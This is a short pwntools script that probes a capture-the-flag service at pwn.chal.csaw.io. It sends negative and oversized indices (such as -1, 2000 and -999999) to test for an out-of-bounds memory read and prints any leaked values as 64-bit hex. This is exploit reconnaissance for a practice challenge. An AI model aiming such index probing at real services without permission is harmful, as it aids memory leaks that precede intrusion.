from pwn import *

def test_index(r, idx):
    r.recvuntil(b"??")
    r.sendline(str(idx).encode())
    try:
        response = r.recvline()
        if b"0x" in response:
            return response.strip()
        return response
    except:
        return b"Timeout or error"

def run_test1():
    print("=== Test 1: -1 and 2000 ===")
    r = remote("pwn.chal.csaw.io", 5000)
    val1 = test_index(r, -1)
    print(f"Index -1: {hex(u64(val1.ljust(8, b'\x00'))) if len(val1) > 2 else val1}")
    val2 = test_index(r, 2000)
    print(f"Index 2000: {hex(u64(val2.ljust(8, b'\x00'))) if len(val2) > 2 else val2}")
    r.close()

def run_test2():
    print("\n=== Test 2: Small negative sequence ===")
    r = remote("pwn.chal.csaw.io", 5000)
    for i in range(1, 4):
        val = test_index(r, -i)
        print(f"Index -{i}: {hex(u64(val.ljust(8, b'\x00'))) if len(val) > 2 else val}")
    r.close()

def run_test3():
    print("\n=== Test 3: Large negative number ===")
    r = remote("pwn.chal.csaw.io", 5000)
    val = test_index(r, -999999)
    print(f"Index -999999: {hex(u64(val.ljust(8, b'\x00'))) if len(val) > 2 else val}")
    r.close()

def main():
    context.log_level = 'error'
    run_test1()
    run_test2()
    run_test3()

if __name__ == '__main__':
    main()

